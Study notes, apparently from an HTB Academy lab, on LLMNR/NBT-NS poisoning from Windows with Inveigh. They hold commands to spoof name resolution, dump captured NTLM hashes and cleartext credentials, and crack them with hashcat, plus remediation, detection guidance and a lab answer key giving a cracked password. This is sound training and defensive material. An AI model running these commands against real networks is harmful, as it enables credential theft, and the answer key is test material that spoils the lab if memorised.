# LLMNR/NBT-NS Poisoning - from Windows (Inveigh) — Notes

## When Would You Use This?

- Client provides a Windows box to test from.
- You land on a Windows host as local admin and want to escalate/expand.
- No Linux attack host available on the network segment.

## Inveigh Overview

| Version | Language | Status | Notes |
|---------|----------|--------|-------|
| PowerShell (`Inveigh.ps1`) | PowerShell | Legacy (no longer updated) | Easy to import and run |
| C# (`Inveigh.exe`) | C# | Actively maintained | Interactive console, more features |

Protocols supported: LLMNR, DNS, mDNS, NBNS, DHCPv6, ICMPv6, HTTP, HTTPS, SMB, LDAP, WebDAV, Proxy Auth.

## Inveigh — Quick Reference

### PowerShell Version

```powershell
# Import and list parameters
Import-Module .\Inveigh.ps1
(Get-Command Invoke-Inveigh).Parameters

# Start with LLMNR + NBNS spoofing, console + file output
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y

# Stop Inveigh
Stop-Inveigh
```

### C# Version (InveighZero)

```powershell
# Run with defaults
.\Inveigh.exe

# Press ESC to enter interactive console
```

### Interactive Console Commands (C# Version)

```
GET NTLMV2UNIQUE        # One hash per user (best for cracking)
GET NTLMV2USERNAMES     # List of captured users + source IPs
GET NTLMV1UNIQUE        # One NTLMv1 hash per user
GET NTLMV1USERNAMES     # List of captured NTLMv1 users
GET CLEARTEXT           # Any captured cleartext credentials
GET CLEARTEXTUNIQUE     # Unique cleartext creds
GET LOG                 # Log entries (supports search filter)
GET CONSOLE             # Queued console output
RESUME                  # Resume real-time console output
STOP                    # Stop Inveigh
HELP                    # Show all commands
```

### Output Location

- File output goes to the directory where Inveigh was launched (e.g., `C:\Tools`).
- Console output: `[+]` = enabled/active, `[ ]` = disabled.
- HTTP listener errors are common (port 80 already in use) — doesn't break SMB/LLMNR capture.

## RDP Connection (Low-Bandwidth Friendly)

```bash
xfreerdp /u:htb-student /p:Academy_student_AD! /v:<TARGET_IP> \
  /cert-ignore /bpp:8 /network:modem /compression \
  -themes -wallpaper /clipboard /audio-mode:1 \
  /auto-reconnect -glyph-cache /dynamic-resolution
```

## Cracking Captured Hashes

Same as Linux — copy the hash to a file and use Hashcat:

```bash
hashcat -m 5600 <hashfile> /usr/share/wordlists/rockyou.txt
```

## Remediation

### Disable LLMNR
- **Group Policy:** Computer Configuration → Administrative Templates → Network → DNS Client → Enable "Turn OFF Multicast Name Resolution"

### Disable NBT-NS
- **Cannot be done via GPO directly.** Must be done per-host or via startup script.
- **Manual:** Network and Sharing Center → Change adapter settings → Adapter Properties → IPv4 Properties → Advanced → WINS tab → "Disable NetBIOS over TCP/IP"
- **Via GPO startup script (PowerShell):**

```powershell
$regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces"
Get-ChildItem $regkey | foreach {
    Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose
}
```

Host the script on SYSVOL: `\\domain.local\SYSVOL\DOMAIN.LOCAL\scripts\disable-nbtns.ps1`
Apply the GPO to target OUs → hosts pick it up on next reboot.

### Other Mitigations
- Filter network traffic to block LLMNR (UDP 5355) and NBT-NS (UDP 137).
- Enable **SMB Signing** to prevent NTLM relay attacks.
- Network segmentation to isolate hosts that require LLMNR/NBT-NS.
- Network IDS/IPS rules for poisoning detection.

## Detection

- **Honeypot approach:** Inject LLMNR/NBT-NS requests for non-existent hosts across subnets. If any response comes back → attacker is spoofing.
- **Monitor traffic:** UDP 5355 (LLMNR) and UDP 137 (NBT-NS).
- **Event IDs:** 4697 and 7045 (service installation — related to relay attacks).
- **Registry monitoring:** `HKLM\Software\Policies\Microsoft\Windows NT\DNSClient` → `EnableMulticast` DWORD. Value `0` = LLMNR disabled.

## MITRE ATT&CK

- **Technique:** T1557.001 — Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay

## Responder vs Inveigh — Comparison

| Feature | Responder (Linux) | Inveigh (Windows) |
|---------|-------------------|-------------------|
| Language | Python | PowerShell / C# |
| Platform | Linux | Windows |
| Interactive console | No (logs to files) | Yes (ESC to enter, GET commands) |
| WPAD proxy | Yes (`-w`) | Yes (enabled by default) |
| File output | `/usr/share/responder/logs/` | Directory where launched |
| Actively maintained | Yes | C# version only |
| Additional protocols | MSSQL, DCE-RPC, FTP, POP3, IMAP, SMTP | DHCPv6, ICMPv6, Kerberos TGT capture |

## Lab Answer

| #   | Question                    | Answer       |
| --- | --------------------------- | ------------ |
| Q1  | svc_qualys cracked password | `security#1` |


<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|ad-enum-attacks]]  
← [[06-llmnr-nbtns-poisoning-linux]] | [[08-password-spraying-overview]] →
<!-- AUTO-LINKS-END -->
